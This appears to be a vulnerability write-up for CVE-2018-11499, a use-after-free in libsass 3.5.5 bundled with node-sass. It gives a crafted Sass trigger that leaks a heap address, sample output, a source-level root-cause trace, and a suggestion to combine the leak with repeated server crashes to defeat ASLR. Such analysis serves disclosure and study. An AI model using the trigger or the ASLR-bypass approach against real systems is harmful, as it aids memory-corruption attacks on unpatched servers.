This document describes how to setup the a NAN Javascript exploit for [CVE-2018-11499](https://nvd.nist.gov/vuln/detail/CVE-2018-11499) against node-sass (libsass version 3.5.5).


CVE-2018-11499 is an information disclosure via a use-after-free. The bug is tracked in the github issue [#2643](https://github.com/sass/libsass/issues/2643). This exploit actually works with the npm version of node-sass since development has stopped on node-sass and it ships with the exploitable version of libsass (3.5.5).

To execute the exploit, first install node-sass:

```
PATH=/bpjs/bpjs/vanilla_node/node_install/bin:$PATH /bpjs/bpjs/vanilla_node/node_install/bin/npm install node-sass
```

This javascript file triggers the exploit

```
// @uebu{

@debug 10emd+ selector-nest('.menu', '&hover lrgba(100, 120, 140, #5)i')Q2em;
```

Here is a sample output:

```
elahtinen@pac-thinkstation:~/free/node-sass$ PATH=/bpjs/bpjs/vanilla_node/node_install/bin:$PATH node sass-exploit.js
{ Error: Invalid CSS after "&": expected selector, was "hover lrgba(100, 1"
    at options.error (/home/elahtinen/free/node-sass/node_modules/node-sass/lib/index.js:290:33)
  status: 1,
  file: '[SELECTOR]',
  line: 1,
  column: 1,
  message: 'Invalid CSS after "&": expected selector, was "\u001ahover lrgba(100, 1"',
  formatted: 'Error: Invalid CSS after "&": expected selector, was "\u001ahover lrgba(100, 1"\n        on line 1 of [SELECTOR], in function `selector-nest`\n        from line 3 of ../../libsass.poc\n>> @v\u00014R\n   ^\n' }
null
```

These unicode characters `\u00014R` are a heap address. Leaking a heap address isn't the most desirable of exploits: a stack address or library address would be more useful (or a Turing complete decoder would be better). But leaking a heap address without crashing the program can be used to defeat ASLR. I'll take a look and see if I can leak some more interesting information, but there isn't much control since it takes place in an exception handler.

Interestingly this exploit actually requires ASLR to be enabled. By default, libsass strips out non-unicode characters from the output. With ASLR disabled the leaked heap address contains invalid unicode characters. With ALSR enabled, some runs will have heap addresses that are all valid unicode characters.

The remainder of the this document describes how the use-after-free occurs.


The use-after-free occurs because of a lack of exception safety in this loop in `selector_nest' in the file (function.cpp:1979)[https://github.com/sass/libsass/blob/39e30874b9a5dd6a802c20e8b0470ba44eeba929/src/functions.cpp#L1972)

```
      std::vector<Selector_List_Obj> parsedSelectors;
      for (size_t i = 0, L = arglist->length(); i < L; ++i) {
        Expression_Obj exp = Cast<Expression>(arglist->value_at_index(i));
        if (exp->concrete_type() == Expression::NULL_VAL) {
          std::stringstream msg;
          msg << "$selectors: null is not a valid selector: it must be a string,\n";
          msg << "a list of strings, or a list of lists of strings for 'selector-nest'";
          error(msg.str(), pstate, traces);
        }
        if (String_Constant_Obj str = Cast<String_Constant>(exp)) {
          str->quote_mark(0);
        }
        std::string exp_src = exp->to_string(ctx.c_options);
        Selector_List_Obj sel = Parser::parse_selector(exp_src.c_str(), ctx, traces);
        parsedSelectors.push_back(sel);
      }
```

In particular, these two lines are are not exception-safe:

```
        Selector_List_Obj sel = Parser::parse_selector(exp_src.c_str(), ctx, traces);
        parsedSelectors.push_back(sel);
```

`exp_src` is allocated on the stack, `Parser::parse_selector` stores a pointer to the memory buffer: `exp_src.c_str()`.
`Parser::parse_selector` throws an exception, unwinds the stack, deleting `exp_src` and freeing the memory buffer.

The exception handler references the freed memory region when constructing the error message.

Starting from the begining, `exp_src` is allocated on the stack and a pointer to it's memory region is passed to `Parser::parse_selector`

```
        std::string exp_src = exp->to_string(ctx.c_options);
        Selector_List_Obj sel = Parser::parse_selector(exp_src.c_str(), ctx, traces);
```


Here the string pointer is `beg` and passed to `Parser::from_c_str` and eventually stored in `Parser p`:

```
  Selector_List_Obj Parser::parse_selector(const char* beg, Context& ctx, Backtraces traces, ParserState pstate, const char* source)
  {
    Parser p = Parser::from_c_str(beg, ctx, traces, pstate, source);
    // ..
    return p.parse_selector_list(false);
  }
```

The pointer `beg` is stored in the `p.source` and `p` is returned:

```
  Parser Parser::from_c_str(const char* beg, Context& ctx, Backtraces traces, ParserState pstate, const char* source)
  {
    pstate.offset.column = 0;
    pstate.offset.line = 0;
    Parser p(ctx, pstate, traces);
    p.source   = source ? source : beg;
    p.position = beg ? beg : p.source;
    p.end      = p.position + strlen(p.position);
    Block_Obj root = SASS_MEMORY_NEW(Block, pstate);
    p.block_stack.push_back(root);
    root->is_root(true);
    return p;
  }
```

With `Parser p` constructed, `p.parse_selector_list` is called. 
```
  Selector_List_Obj Parser::parse_selector(const char* beg, Context& ctx, Backtraces traces, ParserState pstate, const char* source)
  {
    Parser p = Parser::from_c_str(beg, ctx, traces, pstate, source);
    // ..
    return p.parse_selector_list(false);
```

Eventually `parse_selector_list` has a problem and throws an Exception. This is the call chain that leads to the exception.

```
  // parse a list of complex selectors
  // this is the main entry point for most
  Selector_List_Obj Parser::parse_selector_list(bool chroot)
  {
//..
      // now parse the complex selector
      sel = parse_complex_selector(chroot);


  Compound_Selector_Obj Parser::parse_compound_selector()
  {
 //..
         Simple_Selector_Obj sel = parse_simple_selector();

  Simple_Selector_Obj Parser::parse_simple_selector()
  {
// ..
    else {
      css_error("Invalid CSS", " after ", ": expected selector, was ");
    }

  // print a css parsing error with actual context information from parsed source
  void Parser::css_error(const std::string& msg, const std::string& prefix, const std::string& middle, const bool trim)
  {
//..
    error(msg + prefix + quote(left) + middle + quote(right));


  void Parser::error(std::string msg)
  {
    error(msg, pstate);
  }
```

Here the actual `Exception` is created with the `pstate` object and thrown:
```
  void Parser::error(std::string msg, Position pos)
  {
    Position p(pos.line ? pos : before_token);
    ParserState pstate(path, source, p, Offset(0, 0));
    traces.push_back(Backtrace(pstate));
    throw Exception::InvalidSass(pstate, traces, msg);
  }
```

ParseState is copying the `source` pointer to `src`. `source` was set to stack allocated `exp_src` way back:

```
  ParserState::ParserState(const char* path, const char* src, const Position& position, Offset offset)
  : Position(position), path(path), src(src), offset(offset), token() { }
```

So the `Exception` has a pointer (via the `ParserState`) to `exp_src`'s memory buffer.

The exception is thrown and the unwinds past `exp_src` de-allocing its memory buffer.

The Exception is caught and a message is generated:
```
  static int handle_error(Sass_Context* c_ctx) {
    try {
      throw;
    }
    catch (Exception::Base& e) {
    //..
        const char* line_beg = e.pstate.src;
        // scan through src until target line
        // move line_beg pointer to line start
        while (line_beg && *line_beg && lines != 0) {
          if (*line_beg == '\n') --lines;
          utf8::unchecked::next(line_beg); 
        }
```

That `src` is a pointer to the `std::string exp_src` memory buffer which has been deallocated when the stack unwound.

So it is a use-after-free.

The exception handler is looking backwards for the last linefeed or zero, then prints out the line.
At this point the memory in 'line_beg' has been reused and points to a heap pointer.

A `\n` ends up in the memory before a `\0` so the deallocated bytes are outputted.

Unfortunately the error output code checks for valid utf-8 characters:

```
        std::string sanitized; std::string marker(e.pstate.column - move_in, '-');
        utf8::replace_invalid(line_beg, line_end, std::back_inserter(sanitized));
        msg_stream << ">> " << sanitized << "\n";
        msg_stream << "   " << marker << "^\n";
      }
```

So not every address is outputted.

If all the bytes all the bytes a lower than 0x80 then it is valid utf-8, there are a couple other valid numbers. Here is the method that checks for valid start of utf-8 characters:

```
    template <typename octet_iterator>
    inline typename std::iterator_traits<octet_iterator>::difference_type
    sequence_length(octet_iterator lead_it)
    {
        uint8_t lead = utf8::internal::mask8(*lead_it);
        if (lead < 0x80)
            return 1;
        else if ((lead >> 5) == 0x6)
            return 2;
        else if ((lead >> 4) == 0xe)
            return 3;
        else if ((lead >> 3) == 0x1e)
            return 4;
        else
            return 0;
    }
```

Unfortunately with aslr disabled the important bytes are always invalid utf-8. But with ASLR disabled occasionally all the bytes are randomly valid utf-8.

Even knowing that the important byte is > 0x80 would be useful to defeat ASLR via brute force.

Also if you had an exploit the crashed the server. You could execute this exploit and see if you got back a valid address. If you didn't, crash the server and try again until you get back a valid address.
